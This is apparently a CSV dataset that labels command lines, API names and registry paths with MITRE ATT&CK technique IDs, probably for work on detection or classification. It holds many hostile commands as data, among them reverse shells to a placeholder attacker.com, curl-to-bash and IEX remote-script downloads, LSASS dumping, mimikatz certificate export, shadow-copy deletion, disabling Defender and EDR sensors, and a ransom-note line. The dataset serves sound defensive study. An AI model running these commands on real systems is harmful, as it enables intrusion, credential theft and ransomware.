command,mitre_id
bash -c 'echo DATA >/path/to/output-file',T1222
& $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1,T1003
/var/log/secure,T1070
Pcwrun.exe {PATH_ABSOLUTE:.exe},T1218
gem open -e '/bin/sh -s' debug,T1059
sudo sh -c 'echo $path_to_shared_library > /etc/ld.so.preload',T1574
msgconv -P /path/to/input-file,T1005
RunOnce,T1547
"[System.IO.Compression.ZipFile]::CreateFromDirectory($Copy, $Zip, [System.IO.Compression.CompressionLevel]::Optimal, $false)",T1560
$content | Set-Content -Path $tmpFunctionCode # Write the modified content to the file,T1528
NSWorkspace runningApplications(),T1057
NtDelayExecution,T1497
date.exe,T1036
"Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace ""Root\Microsoft\Windows\TaskScheduler"" -MethodName ""RegisterByXml"" -Arguments @{ Force = $true; Xml =$xml; }",T1053
"auditctl -a always,exit -F arch=b32 -S execve -k CMDS",T1056
conhost.exe {CMD},T1202
"& ""$sharphound_path"" -d ""$domain"" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory ""$output_path""",T1069
SetThreadContext,T1055
sockstat -l 2>/dev/null || true,T1049
"echo ""session required pam_tty_audit.so disable=* enable=* open_only log_passwd"" >> /etc/pam.d/sshd",T1056
"[DllImport(""user32.dll"")]",T1566
"start """" $browser --headless --disable-gpu https://mockbin.org/bin/$bin_id",T1564
eventvwr.msc,T1548
LoadLibrary,T1129
"python -c 'import os; os.execl(""/bin/sh"", ""sh"")'",T1059
RequireSigned,T1553
cmstp.exe /s /ns C:\Users\ADMINI~W\AppData\Local\Temp\XKNqbpzl.txt,T1218
Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop,T1562
sc sdset,T1543
Pcwrun.exe /../../$(calc).exe,T1202
if (MatchesExtension $_) {,T1083
gobfuscate,T1027
batcat --paging always /etc/hosts,T1548
gzip -c /path/to/input-file | gzip -d,T1005
tcpdump -ln -i lo -w 'command-argument' -W 1 -G 1 -z /path/to/command,T1059
/private/var/db/emondClients,T1546
which_openssl=`which openssl`,T1486
"auditctl -a always,exit -F arch=b64 -S execve -k CMDS",T1056
.com,T1036
ksu -q -e /bin/sh,T1059
lualatex -shell-escape '\directlua{...}\end',T1548
cbd.exe,T1070
"echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' >package.json",T1059
Find-GPOPassword,T1552
"schtasks /Create /TN ""$task_name"" /TR ""compmgmt.msc"" /SC ONLOGON /RL HIGHEST /F",T1053
pw useradd art -g wheel -s /bin/sh,T1078
mmc.exe -Embedding {PATH_ABSOLUTE:.msc},T1218
echo $ENCODED > $encoded_file && cat $encoded_file | xxd -r -p,T1140
wmic path win32_VideoController get VideoModeDescription,T1082
SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe},T1218
if ($Domain_check.name -ne $null) {,T1110
/Library/Preferences/com.apple.loginwindow.plist,T1037
GetTickCount(),T1124
IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing),T1552
"wsl.exe --exec bash -c ""{CMD}""",T1202
copy %APPDATA%\ualapi.dll %windir%\System32\ualapi.dll,T1574
ProcessDebugFlags,T1106
%USERPROFILE%\AppData\Local\SKC\,T1074
InvocationMethod = 'Executable',T1218
SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths,T1518
"Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1055.012\src\T1055.012-macrocode.txt"" -officeProduct ""$ms_product"" -sub ""Exploit""",T1055
nslookup,T1016
REG ADD HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /t REG_DWORD /d 0,T1562
ash -c 'echo DATA >/path/to/output-file',T1222
"$tr.Add(""[File] $_ Size:$($fi.Length) LastWrite:$($fi.LastWriteTime)"")",T1083
"Write-Host ""User: $($owner.Domain)\$($owner.User)""",T1562
"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers",T1548
tasklist.exe | findstr /i defender,T1518
dlopen,T1129
ScriptRunner.exe -appvscript {PATH_SMB:.cmd},T1218
composer run-script x,T1059
latexmk -pdf -pdflatex='/bin/sh #' /dev/null,T1059
New-InboxRule,T1564
Connect-AzureAD -Credential $Credential > $null,T1098
"Stop-Process -Name ""BadPotato"" -force -erroraction silentlycontinue",T1134
sigverif.exe,T1218
vim -c ':py ...',T1548
if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;,T1056
osascript $scriptfile,T1547
sudo systemctl disable falcon-sensor.service,T1562
touch $file_to_modify,T1222
echo $ENCODED | xxd -r -p,T1140
certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt,T1564
PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON,T1562
AutodiaDLL,T1574
net localgroup users,T1069
VisualUiaVerifyNative.exe,T1218
&lt;GPO_PATH&gt;\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml,T1484
"$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}",T1573
Connect-AZAccount,T1021
/var/opt/quest/vas/authcache/vas_auth.vdb,T1003
Start-Process $UltraVNC_Viewer_Path,T1219
InventoryManager.bk,T1070
"find $file_path/.oci/sessions -name ""token"" -type f 2>/dev/null",T1552
HKEY_CLASSES_ROOT\\Applications\\VMwareHostOpen.exe,T1497
git init .,T1059
~/Documents,T1486
certutil -addstore -f -user ROOT ProgramData\cert512121.der,T1553
esentutl.exe /y {PATH_ABSOLUTE}:file.exe /d {PATH_ABSOLUTE:.exe} /o,T1564
uniq /path/to/input-file,T1005
"Set-ItemProperty -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Name ""UpdateXMLUrlFromOC"" -Value ""$remote_url"" -Type String -Force",T1105
if (Test-Path -Path $registryPath) {,T1505
BlobName = $blob,T1619
PostQueuedCompletionStatus(),T1486
ExecStart=/path/to/command,T1059
$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess],T1098
python.exe,T1059
xclip -o > history.txt,T1115
curl -s $remote_url |bash,T1059
/maps,T1003
if $(printenv SHELL >/dev/null); then printenv SHELL; fi,T1059
"rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}",T1218
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32"" /v ""ThreadingModel"" /T REG_SZ /d ""Apartment"" /f",T1546
gcloud compute os-login ssh-keys add,T1098
/etc/emond.d/rules/,T1546
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters,T1574
chown,T1222
fsinfo,T1082
"Set-MailboxAuditBypassAssociation -Identity ""$target_email"" -AuditBypassEnabled $true",T1562
echo '...' >/path/to/temp-file,T1548
gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user},T1134
PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,T1562
ps aux | egrep 'Little\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu',T1518
"make -s --eval='$(file >/path/to/output-file,DATA)' .",T1222
W32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2,T1124
"Get-Content ""$image_file"", ""$tar_file"" -Encoding byte -ReadCount 0 | Set-Content ""$new_image_file"" -Encoding byte",T1001
action keys,T1546
"mklink c:\testbypass.exe ""\\?\C:\Windows \System32\mmc.exe""",T1548
cmd.exe /c ipconfig /all,T1016
"reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d 0 /f",T1112
aws configservice delete-configuration-recorder --configuration-recorder-name $configuration_recorder_name --region $region,T1562
"""$mimikatz_exe"" ""crypto::certificates /systemstore:local_machine /store:my /export"" exit",T1552
Sort-Object LastWriteTime -Descending |,T1562
"New-ItemProperty -Path HKLM:""\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom"" -Name ""AtomicRedTeamT1546.011"" -Value ""AtomicRedTeamT1546.011""",T1546
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f",T1112
[HKLM|HKCU]\…\CurrentVersion\Run,T1547
t:send(d);,T1105
odbcad32.exe,T1548
[System.IO.Directory]::EnumerateDirectories($userProfile) | ForEach-Object { Scan-Dir $_ },T1083
C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip},T1105
"schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st $time",T1053
HeapCreate,T1106
Start-Sleep -Seconds 1,T1202
foreach ($entry in $archive.Entries) {,T1562
show configuration,T1082
sudo /Library/StartupItems/atomic.sh start,T1037
sharing -l,T1135
cat $sh_history_filename | grep $sh_history_grep_args > $output_file,T1552
cdist shell -s /bin/sh,T1059
DownloadString,T1047
cat /path/to/output-file,T1005
Set-AWSAuthentication -AccessKey $access_key -SecretKey $secret_key -SessionToken $session_token -AWSProfile $aws_profile,T1526
sudo $program_path -i $ifname -t 3,T1040
RmGetList,T1057
cat /etc/login.defs,T1201
%windir%,T1055
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe,T1219
"wscript ""$jscript""",T1059
"New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force",T1548
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OutlookMicrosift,T1547
dsquery,T1087
which sh,T1083
whoami.exe,T1033
OneDrive.exe,T1036
ansible-playbook /path/to/temp-file,T1059
netstat -ano | findstr EST,T1049
PyArmor,T1027
netsh.exe advfirewall show allprofiles,T1518
"Add-ADGroupMember ""$group"" $account",T1098
zsoelim /path/to/input-file,T1005
"reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v ""DelegateExecute"" /f",T1548
Get-AntiPhishRule,T1562
rake -f /path/to/input-file,T1005
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force,T1491
"""powershell.exe"" /c net user DefaultAccount /active:yes",T1078
"REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""$thing_to_execute""",T1547
tar -xf {PATH}:ads,T1564
Invoke-AllChecks,T1059
"Write-Host ""Creating registry keys in HKCU:Software\Classes\CLSID\$clsid_guid"" -ForegroundColor Cyan",T1574
vim-cmd vmsvc/getallvms,T1564
"busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",T1059
HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32,T1546
zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY',T1059
rpcping -s $server_ip -e $custom_port -a privacy -u NTLM 1>$Null,T1003
%WINDIR%\AppPatch\sysmain.sdb,T1546
run-parts /path/to/temp-dir/,T1059
fail2ban-client set x banip 999.999.999.999,T1059
Xcat,T1041
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType $command_line_switch_type -EncodedCommandParamVariation $encoded_command_param_variation -Execute -ErrorAction Stop,T1059
"lua -e 'local f=io.open(""/path/to/input-file"", ""rb""); io.write(f:read(""*a"")); io.close(f);'",T1005
Get-ProcessTokenGroup,T1087
Set-MpPreference -dscrptsc $True,T1562
vaultcmd.exe,T1555
com.apple.loginwindow.plist,T1037
Pester.bat ;{PATH:.exe},T1216
ssh,T1070
"pty.spawn(""/bin/sh"")'",T1059
{$Response = $_.Exception.Response.GetResponseStream(),T1619
TTTracer.exe -dumpFull -attach {PID},T1003
IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force,T1555
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null,T1137
HKLM\Software[\\Wow6432Node\\]\Microsoft\Windows NT\CurrentVersion\Winlogon\,T1547
socket -qvp '/bin/sh -i' attacker.com 12345,T1059
logsave /dev/null /bin/sh -i,T1059
findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe,T1564
echo 0> $log_path,T1070
"Set-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"" -Name ""atomictest"" -Value '""C:\Windows\System32\mshta.exe"" http://localhost/hello6.hta'",T1204
iftop,T1059
taskkill.exe /f /im $process_name,T1489
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine,T1112
reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f,T1112
ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL},T1567
del %TEMP%\redcanary.cab >nul 2>&1,T1105
auditpol.exe,T1562
"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$target_binary"" /v GlobalFlag /t REG_DWORD /d 512",T1546
Mozilla\Firefox Default Browser Agent 409046Z0FF4A39CB,T1053
mkdir -p /path/to/temp-dir/filter.d/,T1059
MMDeviceEnumerator,T1546
tty_tickets,T1548
File,T1562
HKLM\Software\NFC\,T1012
filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi,T1037
echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0,T1078
chflags simmutable $file_to_modify,T1222
grep -ri password $file_path,T1552
Import-Module ActiveDirectory,T1098
New-GPOImmediateTask,T1484
"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam"" /v ""Driver"" /d ""AtomicTest.dll"" /t REG_SZ /f",T1547
cp /bin/sh /path/to/temp-dir/,T1059
wmic path win32_VideoController get DriverVersion,T1082
netscan.exe,T1046
"New-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force",T1112
bashbug,T1548
QueueName = $queue,T1619
cd /tmp/GoAWSConsoleSpray,T1110
username=$(id -u -n) && lsof -u $username,T1087
reg save hklm\security,T1003
echo Tickets after requesting schtasks:,T1558
"TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""{PATH:.exe}""",T1127
"wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=\""ATOMICREDTEAM\""",T1562
wscript.exe,T1216
import yum,T1548
/etc/audit/audit.rules,T1562
sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist,T1562
"Write-Host -ForegroundColor Yellow ""The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials""",T1098
SIGCHLD,T1564
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableChangePassword /t REG_DWORD /d 1 /f",T1112
"if [ -x ""$(command -v dscacheutil)"" ]; then dscacheutil -q group; else echo ""dscacheutil is missing from the machine. skipping...""; fi;",T1069
Write-Host -ForegroundColor Red $result,T1016
copy '$local_file' 'Z:\',T1570
ls -al /Applications,T1082
"Invoke-DNSExfiltrator -i ""$ps_module"" -d $domain -p $password -doh $doh -t $time $encoding",T1048
"Write-Output ""`nDownloaded storage account objects to $output_file""",T1619
kextfind,T1652
"& (-join $ps) ""-Command"" (-join $cmd)",T1027
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet"" -Name ""SpynetReporting"" -Value 0",T1562
if_nameindex,T1016
procmail -m /path/to/temp-file,T1059
touch -a -t 197001010000.00 $target_filename,T1070
} else {,T1003
"php -r 'system(""/bin/sh -i"");'",T1059
$decryptedString | Out-File $env:temp\T1027.013_decryptedEicar.txt,T1027
/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist file,T1046
Set-MpPreference -DisableScriptScanning 1,T1562
init,T1036
HKCU\Software\Microsoft\Windows\Current Version\Run,T1547
"if((($Manufacturer.ToLower() -eq ""microsoft corporation"") -and ($Model.ToLower().contains(""virtual""))) -or ($Manufacturer.ToLower().contains(""vmware"")) -or ($Model.ToLower() -eq ""virtualbox"")) {write-host ""Virtualization environment detected!""} else {write-host ""No virtualization environment detected!""}",T1497
schtasks.exe /F /Create /TN Microsoft_Licensing /sc minute /MO 1 /TR C:\\Users\\Public\\Libraries\...,T1053
var fw=new FileWriter('/path/to/output-file');,T1222
nmap --interactive,T1059
sudo chmod +x /etc/rc.common,T1037
"Start-Process -FilePath ""$executable_filepath""",T1036
"$sslStream.AuthenticateAsClient('fakedomain.example', $null, ""Tls12"", $false)",T1573
Set-Location $datePath,T1105
New-Item -type Directory $ExcelRegPath -Force | Out-Null,T1137
"Write-Host ""[i] IP Address List: $ip_list""",T1046
"Write-Output ""`nFound storage account $($account.name)""",T1619
Start-Process 'C:\Program Files (x86)\UltraViewer\UltraViewer_Desktop.exe',T1219
"Start-Process ""$dirlister_path""",T1083
~/Downloads,T1486
pktmon.exe start --etw -f %TEMP%\t1040.etl,T1040
"tar xf /dev/null -I '/bin/sh -c ""/bin/sh 0<&2 1>&2""'",T1059
fold -w999 /path/to/input-file,T1005
GetUserDefaultLangID,T1614
/Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment,T1056
esxcli system clock get,T1124
Invoke-WebRequest -Uri $url -OutFile $outfile -UseBasicParsing,T1204
Set-Acl -Path $termsrvDll -AclObject $ACL,T1505
"""cmd.exe"" /C whoami",T1059
echo $ENCODED > $encoded_file && b64decode -r < $encoded_file,T1140
grep '*:0:' /etc/passwd >> $output_file,T1087
IP Helper,T1036
choom -n 0 /bin/sh,T1059
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -Value $newvalue,T1547
diff --line-format=%L /dev/null /path/to/input-file,T1005
echo '$command_to_add' >> ~/.bashrc,T1546
/System/Librarby/LaunchDaemons/ssh.plist,T1569
tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh,T1105
"echo ""3. The security report or the exclusive first-hand information that you will receive upon reaching an agreement is of a great value, since NO full audit of your network will show you the vulnerabilities that we' ve managed to detect and used in order to get into. identify backup solutions and upload your data."" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
gcloud iam service-accounts list,T1087
"if [ ""$(uname)"" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;",T1007
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -sc exchaddresses $optional_args",T1087
bbot -d -cy /path/to/input-file,T1005
systemctl restart auditd,T1056
MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe},T1105
docker exec t1069_container ./test.sh,T1069
"$History | Out-File -FilePath ""$Env:USERPROFILE\Downloads\chromebrowsinghistory.txt""",T1217
"Set-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection"" -Name ""DisallowExploitProtectionOverride"" -Value 0",T1562
"& ""PathToAtomicsFolder\T1055\bin\x64\RWXinjectionLocal.exe"" ""$vuln_dll"" $address",T1055
"set s [socket attacker.com 12345];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;",T1059
"rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}",T1105
"sc.exe create ""WerFaultSvc"" binPath= ""$env:windir\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\WerFault.exe"" DisplayName= ""WerFault Service"" start= auto",T1569
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1,T1105
Set-EtwTraceProvider,T1562
"$xlApp.Run(""runme"")",T1204
cd $hashcat_exe\..,T1110
regasm.exe {PATH:.dll},T1218
spoolsv.exe,T1547
pipx run /path/to/file.py,T1548
icacls <path> /grant Everyone:F /T /C /Q,T1222
/Library/Preferences/,T1518
show flash,T1083
RegQueryValueExA,T1012
HKCU\Software\Policies\Google\Chrome\ExtensionInstallForcelist,T1112
certutil -encode $executable %temp%\T1140_calc.txt,T1140
get-localgroupmember -group Users,T1087
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL"" /ve /T REG_SZ /d ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct"" /f",T1546
bundle exec /bin/sh,T1059
", and",T1564
. C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1 \nrunAfterCancelProcess {PATH:.ps1},T1216
msxsl.exe customers[.]xml script[.]xsl,T1220
Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use,T1059
"$process.Id | Out-File ""$env:TEMP\click-fix-pid.txt""",T1204
%windir%\system32\cleanmgr.exe,T1574
"Write-Host ""SeDebugPrivilege enabled successfully."" -ForegroundColor Green",T1562
Install-TransportAgent -Name $transport_agent_identity -TransportAgentFactory $class_factory -AssemblyPath $dll_path,T1505
Remove-Item -path $file_to_delete,T1070
cscript //E:Jscript $script_file,T1204
touch $target_filename,T1070
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll,T1546
sudo dscl . -create /Users/$user_name IsHidden 1,T1564
kubectl run $pod_name --image=$image_name --restart=Never --rm -it -- curl -ksL $remote_url,T1105
"Get-ChildItem -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -File | ForEach-Object { Add-Content -Path $_.FullName -Value ""Modification for Atomic Red Test"" -ErrorAction Ignore }",T1070
"if [ -x ""$(command -v netstat)"" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo ""netstat is missing from the machine. skipping...""; fi;",T1016
kldstat | grep vmm,T1082
sudo security dump-keychain -d login.keychain,T1555
Export-Certificate -Type CERT -Cert Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath $pfx_path,T1552
%STARTUP%,T1547
$totalopen++ | Out-Null,T1016
"rundll32.exe ieadvpack.dll,LaunchINFSection ""$inf_to_execute"",DefaultInstall_SingleUser,1,",T1218
esxcli system account add,T1136
execvpe,T1574
if ($test.Connected) {,T1016
"rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}",T1218
StorageAccountName = $account.name,T1619
New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id,T1114
/etc/systemd/system/,T1053
Write-Host $Computer},T1018
"net group /domain ""Domain controllers""",T1018
"msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv",T1003
libc read,T1056
"cmd /c ""$ps_exec_location"" -accepteula -i -s cmd.exe /c logman update trace ""$session"" --p ""$provider"" -ets",T1562
regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll,T1218
"schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe""",T1053
/api/v1/cav/client/visits,T1071
"Remove-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore",T1070
Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap,T1112
"(user permissions),",T1564
pyright -w /path/to/input-dir/,T1005
service pf disable,T1562
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt,T1552
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs – %APPDATA%\Intel\ResN32.dll,T1546
"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\DefragPath"" /t REG_EXPAND_SZ /d ""%systemroot%\system32\notepad.exe"" /f",T1112
get -b <start ip> -e <end ip> -p,T1046
"IF EXIST ""%temp%\Windows_Defender_Cache_Maintenance.xml"" ( schtasks /delete /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance"" /f )",T1562
C:\\Windows\\system32\\wbem\\wmic.exe shadowcopy delete,T1490
LderGetProcedureAddress(),T1027
Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false,T1021
sudo setcap cap_setuid=ep /tmp/cap,T1548
Morerecon -noninteractive -consoleoutput,T1082
"echo -n ""(hostname) "" >> $mount_point$cron_path/$cron_filename",T1611
ctrl+d,T1546
"sc create W64Time binPath= ""c:\Windows\System32\svchost.exe -k TimeService"" type= share start=auto",T1543
[System.ComponentModel.RunInstaller(true)],T1218
redcarpet /path/to/input-file,T1005
testcat /etc/shadow,T1003
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1'),T1136
"if((Get-ADUser $remove_user -Properties memberof).memberof -like ""CN=Domain Admins*""){",T1531
check_ssl_cert --grep-bin /path/to/temp-file -H x,T1059
". ""$HOME\textExtraction.ps1""",T1001
"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\ExcelVBAaddin.xlam"" ""$env:APPDATA\Microsoft\Excel\XLSTART\notepad.xlam""",T1137
.ahk,T1059
reg query “HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\InternetSettings”,T1012
$FILE_NAME,T1070
"if (-not (Test-Path ""$onedrive_path"")) {",T1105
"echo ""$message"" > ""$file_contents_path"" & type ""$file_contents_path""",T1059
download,T1041
GET https://cloudidentity.googleapis.com/v1/groups,T1069
New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort $NEW_Remote_Port,T1021
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce,T1060
reg.exe query HKLM\SYSTEM\CurrentControlSet\Control /v SystemStartOptions,T1012
at.allow,T1053
cd $PathToAtomicsFolder\T1560.001\victim-files,T1560
sudo kextload $module_path,T1547
.PS,T1059
"if [ ""$unamestr"" = 'Linux' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/shadow\n,p\n"" | ed > $output_file; elif [ ""$unamestr"" = 'FreeBSD' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n"" | ed > $output_file; fi",T1003
Get-EventLog -list,T1070
bash $linenum,T1059
